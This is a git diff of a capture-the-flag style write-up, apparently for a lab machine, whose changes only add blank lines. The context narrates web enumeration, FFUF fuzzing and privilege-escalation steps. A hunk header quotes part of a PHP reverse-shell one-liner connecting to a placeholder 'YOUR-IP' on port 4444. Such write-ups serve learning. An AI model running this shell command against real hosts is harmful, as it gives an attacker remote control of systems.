@@ -45,6 +45,7 @@ index.php
 info.php
 ```
 If we visit the info.php we will find the PHP Version 7.2.24 which is vulnerable to RCE. The index.php is more interesting and it contains a list of files in a folder on the Server.
+
 <img width="525" height="195" alt="image" src="https://github.com/user-attachments/assets/491a69a8-d8fa-4ea1-9b52-d25f4bd35163" />
 
 I give a try and test some wordkeys like cmd of just a ? after the .php extention but with no luck. So I try again with FFUF but this time a little bit different.
@@ -74,6 +75,7 @@ php -r '$sock=fsockopen("YOUR-IP",4444);$proc=proc_open("bash", array(0=>$sock, 
 <img width="1907" height="598" alt="image" src="https://github.com/user-attachments/assets/9e5579d2-eff7-4c7d-bee2-bb69ec3d5660" />
 
 Navigating to user Mike there are some hidden files that we have no permissions(.ssh) but there is also a file called **1cryptupx** and it is executable. 
+
 <img width="576" height="232" alt="image" src="https://github.com/user-attachments/assets/bbb223c7-453a-45b9-80bf-20d843de5678" />
 
 ## Root Access
